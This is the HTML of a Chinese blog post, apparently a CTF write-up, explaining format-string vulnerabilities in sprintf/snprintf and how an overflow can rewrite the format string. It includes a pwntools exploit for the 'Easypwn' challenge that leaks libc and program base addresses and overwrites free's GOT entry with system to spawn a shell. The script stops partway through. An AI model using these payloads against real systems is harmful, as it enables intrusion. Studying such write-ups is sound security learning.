@@ -1,0 +1,587 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.1.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.ico">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <link rel="manifest" href="/images/manifest.json">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-corner-indicator.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"ikoct.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="本文主要介绍s[n]printf的格式化字符串漏洞用法以及和printf格式化字符串漏洞的区别">
+<meta property="og:type" content="article">
+<meta property="og:title" content="s[n]printf的格式化字符串漏洞">
+<meta property="og:url" content="https://ikoct.com/2025/03/09/s-n-printf%E7%9A%84%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/">
+<meta property="og:site_name" content="Ikoct的饮冰室">
+<meta property="og:description" content="本文主要介绍s[n]printf的格式化字符串漏洞用法以及和printf格式化字符串漏洞的区别">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2025%2F03%2F09%2F20250309-213717.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2025%2F03%2F09%2F20250309-213818.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2025%2F03%2F09%2F20250309-220942.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2025%2F03%2F09%2F20250309-221210.png">
+<meta property="article:published_time" content="2025-03-09T14:16:19.000Z">
+<meta property="article:modified_time" content="2025-03-09T14:16:19.774Z">
+<meta property="article:author" content="1K0CT B14s">
+<meta property="article:tag" content="Pwn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2025%2F03%2F09%2F20250309-213717.png">
+
+<link rel="canonical" href="https://ikoct.com/2025/03/09/s-n-printf%E7%9A%84%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>s[n]printf的格式化字符串漏洞 | Ikoct的饮冰室</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Ikoct的饮冰室</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">你愿意和我学一辈子二进制吗?</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://ikoct.com/2025/03/09/s-n-printf%E7%9A%84%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/myavatar.gif">
+      <meta itemprop="name" content="1K0CT B14s">
+      <meta itemprop="description" content="残りの人生、私にくれませんか？">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Ikoct的饮冰室">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          s[n]printf的格式化字符串漏洞
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2025-03-09 22:16:19" itemprop="dateCreated datePublished" datetime="2025-03-09T22:16:19+08:00">2025-03-09</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6/" itemprop="url" rel="index"><span itemprop="name">二进制</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6/Pwn/" itemprop="url" rel="index"><span itemprop="name">Pwn</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>6.2k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>6 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>本文主要介绍<code>s[n]printf</code>的格式化字符串漏洞用法以及和printf格式化字符串漏洞的区别</p>
+<span id="more"></span>
+
+<h1 id="s-n-printf的格式化字符串漏洞"><a href="#s-n-printf的格式化字符串漏洞" class="headerlink" title="s[n]printf的格式化字符串漏洞"></a>s[n]printf的格式化字符串漏洞</h1><h2 id="s-n-printf函数介绍"><a href="#s-n-printf函数介绍" class="headerlink" title="s[n]printf函数介绍"></a>s[n]printf函数介绍</h2><p>函数原型<code>int s[n]printf(char *str, size_t size, const char *format, ...);</code> 作用和printf类似 只不过原来输出到终端的结果会保留在<code>str</code>中 返回值是向<code>str</code>中输入的字符个数 <code>snprintf</code>和<code>sprintf</code>的区别是前者限制了可写入字符数</p>
+<h2 id="更多格式化字符串漏洞的可能性"><a href="#更多格式化字符串漏洞的可能性" class="headerlink" title="更多格式化字符串漏洞的可能性"></a>更多格式化字符串漏洞的可能性</h2><p>与printf相比s[n]printf是一种更危险的格式化输出方式 原因之一是即使用户能控制的不是参数<code>format</code>也是有造成漏洞的可能性的</p>
+<p>考虑以下情况:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">*    stack frame:</span></span><br><span class="line"><span class="comment">*    &lt;low&gt;</span></span><br><span class="line"><span class="comment">*    buf2[0x20]</span></span><br><span class="line"><span class="comment">*    buf3[0x20]</span></span><br><span class="line"><span class="comment">*    buf1[0x100]</span></span><br><span class="line"><span class="comment">*    &lt;high&gt;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">buf3 = <span class="string">&quot;%s\x00&quot;</span>;</span><br><span class="line"><span class="built_in">sprintf</span>(buf2, buf3, buf1);</span><br></pre></td></tr></table></figure>
+
+<p>用户可以控制<code>buf1</code> 但是明显当对格式化字符串检测到<code>%s</code>时 若buf1(<strong>未被b’\x00’截断</strong>)的长度大于0x20时 继续复制字符到buf2会导致溢出至格式化字符串buf3</p>
+<p>由于buf3中”%s”的功能在实现过程中对格式化字符串的解析已经进行到”%s__xxx__”中粗体的部分了 所以要想修改成的目标格式化字符串生效需要填充这两个被解析过的字符</p>
+<p>新的格式化字符串(xxx的部分)的解析也是基于s[n]printf在调用前一刻的<code>RSP</code>的</p>
+<h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>以以下代码编译出的程序为例:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> buf1[<span class="number">0x100</span>];</span><br><span class="line">    <span class="type">char</span> buf3[<span class="number">0x20</span>] = <span class="string">&quot;%s\x00&quot;</span>;</span><br><span class="line">    <span class="type">char</span> buf2[<span class="number">0x20</span>];</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="built_in">memset</span>(buf1, <span class="number">0</span>, <span class="number">0x100</span>);</span><br><span class="line">        read(<span class="number">0</span>, buf1, <span class="number">0x100</span>);</span><br><span class="line">        <span class="built_in">sprintf</span>(buf2, buf3, buf1);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>模拟了上文提到的那种情况 简单发送一个泄露<code>RSI</code>储存的指针的payload进行实验:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x20</span> + <span class="string">b&#x27;==%p&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>调用前:</p>
+<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2025%2F03%2F09%2F20250309-213717.png" alt="image-20250309213710036"></p>
+<p>调用后:</p>
+<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2025%2F03%2F09%2F20250309-213818.png" alt="image-20250309213818785"></p>
+<p>可以看到新覆盖上的格式化字符串被成功的解析了 同时根据格式化字符串解析规则 这段新的格式化字符串也将被复制到buf2中 这也就是为什么后面会不断重复这个输出</p>
+<p>这里再介绍一下</p>
+<h3 id="格式化字符串在s-n-printf中解析的规则"><a href="#格式化字符串在s-n-printf中解析的规则" class="headerlink" title="格式化字符串在s[n]printf中解析的规则"></a>格式化字符串在s[n]printf中解析的规则</h3><p>以这样一个格式化字符串为例: <code>b&#39;%s1234%567c%7$hhn&#39;</code></p>
+<p>可以将其分段成以下形式<code>b&#39;[%s][1234][%567c][%7$hhn]&#39;</code></p>
+<ol>
+<li>%s会打印第二个参数存放的指针指向的字符串</li>
+<li>打印’1234’</li>
+<li>输出567个空格</li>
+<li>将上面输出的所有东西的字符数 &amp; 0xff写入<code>RSP</code>指向位置存放的指针指向的内存</li>
+</ol>
+<p>对新添加的格式化字符串同样适用 直到被b’\x00’截断</p>
+<p>看一道题目来加深理解</p>
+<h3 id="攻防世界-Easypwn"><a href="#攻防世界-Easypwn" class="headerlink" title="[攻防世界] Easypwn"></a>[攻防世界] Easypwn</h3><p>checksec除了RELRO保护全开</p>
+<p>伪代码:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+14h] [rbp-1Ch]</span></span><br><span class="line">  <span class="type">void</span> *name; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line">  <span class="type">char</span> nptr[<span class="number">8</span>]; <span class="comment">// [rsp+20h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v8; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">11</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    write(<span class="number">1</span>, <span class="string">&quot;Input Your Code:\n&quot;</span>, <span class="number">0x11</span>uLL);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%4s&quot;</span>, nptr);</span><br><span class="line">    v5 = atoi(nptr);</span><br><span class="line">    <span class="keyword">if</span> ( v5 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      get_input();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v5 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">      name = <span class="built_in">malloc</span>(<span class="number">0x100</span>uLL);</span><br><span class="line">      write(<span class="number">1</span>, <span class="string">&quot;Input Your Name:\n&quot;</span>, <span class="number">0x11</span>uLL);</span><br><span class="line">      read(<span class="number">0</span>, name, <span class="number">0x100</span>uLL);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;OK!I Know Your Name :%sNow!&quot;</span>, (<span class="type">const</span> <span class="type">char</span> *)name);</span><br><span class="line">      <span class="built_in">free</span>(name);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">get_input</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s1[<span class="number">1024</span>]; <span class="comment">// [rsp+10h] [rbp-BF0h] BYREF</span></span><br><span class="line">  <span class="type">char</span> s2[<span class="number">1000</span>]; <span class="comment">// [rsp+410h] [rbp-7F0h] BYREF</span></span><br><span class="line">  <span class="type">char</span> s3[<span class="number">1024</span>]; <span class="comment">// [rsp+7F8h] [rbp-408h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+BF8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(s1, <span class="number">0</span>, <span class="keyword">sizeof</span>(s1));</span><br><span class="line">  <span class="built_in">memset</span>(s3, <span class="number">0</span>, <span class="number">8uLL</span>);</span><br><span class="line">  <span class="built_in">memset</span>(s2, <span class="number">0</span>, <span class="number">0x7E8</span>uLL);</span><br><span class="line">  <span class="built_in">strcpy</span>(s3, <span class="string">&quot;%s&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome To WHCTF2017:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, s1, <span class="number">0x438</span>uLL);</span><br><span class="line">  <span class="built_in">snprintf</span>(s2, <span class="number">0x7D0</span>uLL, s3, s1);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Your Input Is :%s\n&quot;</span>, s2);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>明显<code>get_input()</code>中就有上文提到的漏洞 唯一的难点就是如何利用 </p>
+<p>第一步还是先尽可能泄露能用到的值 这里选择泄露libc基址和程序被载入的基址 动态调试一下看看距离<code>RSP</code>多远即可:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">choose</span>(<span class="params">c</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Code:\n&#x27;</span>, <span class="built_in">str</span>(c).encode())</span><br><span class="line"></span><br><span class="line">padding = <span class="string">b&#x27;1&#x27;</span> * <span class="number">1000</span></span><br><span class="line">payload = padding + <span class="string">b&#x27;++|1|%397$p|2|%389$p|3|&#x27;</span></span><br><span class="line">choose(<span class="number">1</span>)</span><br><span class="line">sa(<span class="string">b&#x27;WHCTF2017:&#x27;</span>, payload)</span><br><span class="line">ru(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">leak = <span class="built_in">int</span>(r(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">libc_base = leak - <span class="number">0x20830</span></span><br><span class="line">log.success(<span class="string">&#x27;libc_base = %#x&#x27;</span> % libc_base)</span><br><span class="line">ru(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">leak = <span class="built_in">int</span>(r(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">program_base = leak - <span class="number">0xcf9</span></span><br><span class="line">log.success(<span class="string">&#x27;program_base = %#x&#x27;</span> % program_base)</span><br></pre></td></tr></table></figure>
+
+<p>接下来的思路有几种 一种是直接修改free的got表为system 然后在<code>name</code>中存入b’&#x2F;bin&#x2F;sh\x00’后free掉 或者通过get_input的RBP修改main的RBP 进一步修改main的返回地址打ret2libc</p>
+<p>但是这题限制了输入的次数 所以选择改got表</p>
+<p>那就需要往栈上写入free的got表地址 而这个地址是一定会把字符串给截断的 所以需要放在最后 剩下的就是计算写入的实际字节与payload的关系了 最后构造一个向got表写入字节的函数:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">write_byte_at</span>(<span class="params">byte, addr</span>):</span><br><span class="line">    payload  = <span class="string">b&#x27;1&#x27;</span> * <span class="number">1000</span></span><br><span class="line">    payload_ = <span class="string">f&#x27;==%<span class="subst">&#123;<span class="number">258</span> + byte&#125;</span>c%133$hhn&#x27;</span>.encode()</span><br><span class="line">    payload_ += <span class="string">b&#x27;=&#x27;</span> + p64(addr)    <span class="comment"># 这一步是为了栈对齐</span></span><br><span class="line">    payload  += payload_</span><br><span class="line">    choose(<span class="number">1</span>)</span><br><span class="line">    sa(<span class="string">b&#x27;WHCTF2017:&#x27;</span>, payload)</span><br></pre></td></tr></table></figure>
+
+<p>完整payload:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn1&#x27;</span>)</span><br><span class="line">so = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr          :log.success(<span class="string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line">l64     = <span class="keyword">lambda</span>      :u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">l32     = <span class="keyword">lambda</span>      :u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choose</span>(<span class="params">c</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Code:\n&#x27;</span>, <span class="built_in">str</span>(c).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_byte_at</span>(<span class="params">byte, addr</span>):</span><br><span class="line">    payload  = <span class="string">b&#x27;1&#x27;</span> * <span class="number">1000</span></span><br><span class="line">    payload_ = <span class="string">f&#x27;==%<span class="subst">&#123;<span class="number">258</span> + byte&#125;</span>c%133$hhn&#x27;</span>.encode()</span><br><span class="line">    payload_ += <span class="string">b&#x27;=&#x27;</span> + p64(addr)</span><br><span class="line">    payload  += payload_</span><br><span class="line">    choose(<span class="number">1</span>)</span><br><span class="line">    sa(<span class="string">b&#x27;WHCTF2017:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = remote(&#x27;localhost&#x27;, 20000)</span></span><br><span class="line">p = remote(<span class="string">&#x27;61.147.171.106&#x27;</span>, xxxxx)</span><br><span class="line">choose(<span class="number">2</span>)</span><br><span class="line">s(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">padding = <span class="string">b&#x27;1&#x27;</span> * <span class="number">1000</span></span><br><span class="line"><span class="comment"># payload = padding + b&#x27;++&#x27; + &#x27;-&#x27;.join([f&#x27;|&#123;i&#125;|%&#123;i&#125;$p&#x27; for i in range(389, 392)]).encode()</span></span><br><span class="line">payload = padding + <span class="string">b&#x27;++|1|%397$p|2|%389$p|3|&#x27;</span></span><br><span class="line">choose(<span class="number">1</span>)</span><br><span class="line">sa(<span class="string">b&#x27;WHCTF2017:&#x27;</span>, payload)</span><br><span class="line">ru(<span 